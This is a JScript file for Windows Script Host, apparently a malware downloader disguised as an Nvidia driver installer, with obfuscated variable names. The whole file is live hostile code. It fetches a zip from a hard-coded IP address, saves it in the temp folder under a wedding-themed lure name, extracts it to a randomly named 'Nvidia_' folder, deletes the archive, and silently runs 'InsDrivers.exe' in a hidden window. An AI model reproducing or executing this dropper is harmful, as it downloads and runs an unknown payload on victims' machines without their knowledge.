var zAUCTYweVyBdh = new ActiveXObject("Scripting.FileSystemObject");
var RNZujKeuOWUvU = zAUCTYweVyBdh.GetSpecialFolder(2);
var QDKHsItqDgfvd = RNZujKeuOWUvU + "\\CasamentoDoRicardoMTG.zip";


function unzip(zipfile,    // @param String: Zipped file path
               unzipdir) { // @param String: Unzip target directory path
       var shell = new ActiveXObject('Shell.Application'),
        dst, zip;
    
    if (!unzipdir) {
        unzipdir = '.';
    }
    if (!zAUCTYweVyBdh.FolderExists(unzipdir)) {
        zAUCTYweVyBdh.CreateFolder(unzipdir);
    }
    dst = shell.NameSpace(zAUCTYweVyBdh.getFolder(unzipdir).Path);
    zip = shell.NameSpace(zAUCTYweVyBdh.getFile(zipfile).Path);
    if (zAUCTYweVyBdh.FileExists(zipfile)) {
        dst.CopyHere(zip.Items(), 4 + 16);
    }
}

function nvidia() {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  for (var i = 0; i < 7; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

var gfWdvJaKPrQzs = "http://80.211.89.35/chileno/DriversNvidia.zip";
var AwYuGTltkaUYg = new ActiveXObject("MSXML2.XMLHTTP");
var Folder = RNZujKeuOWUvU + "\\Nvidia_" + nvidia();

AwYuGTltkaUYg.open("GET", gfWdvJaKPrQzs, false);
AwYuGTltkaUYg.send();

if(AwYuGTltkaUYg.Status == 200)
{ 
  var lKmXIVTGFWZFj = new ActiveXObject("Scripting.FileSystemObject");
  if(lKmXIVTGFWZFj.FileExists(QDKHsItqDgfvd)) 
  { 
    lKmXIVTGFWZFj.DeleteFile(QDKHsItqDgfvd) 
  } 
  var HVmsWpXVOVzVF = new ActiveXObject("ADODB.Stream");	
  HVmsWpXVOVzVF.Open();
  HVmsWpXVOVzVF.Type= 1;
  HVmsWpXVOVzVF.Write(AwYuGTltkaUYg.ResponseBody);
  HVmsWpXVOVzVF.Position= 0;
  HVmsWpXVOVzVF.SaveToFile(QDKHsItqDgfvd);
  HVmsWpXVOVzVF.Close();
  unzip(QDKHsItqDgfvd, Folder); 
  if(lKmXIVTGFWZFj.FileExists(QDKHsItqDgfvd)) 
  { 
    lKmXIVTGFWZFj.DeleteFile(QDKHsItqDgfvd) 
  }   
  var MOBeoDekfTHxT = new ActiveXObject("WScript.Shell");
  MOBeoDekfTHxT.Run(Folder + "\\InsDrivers.exe", 0, true);
}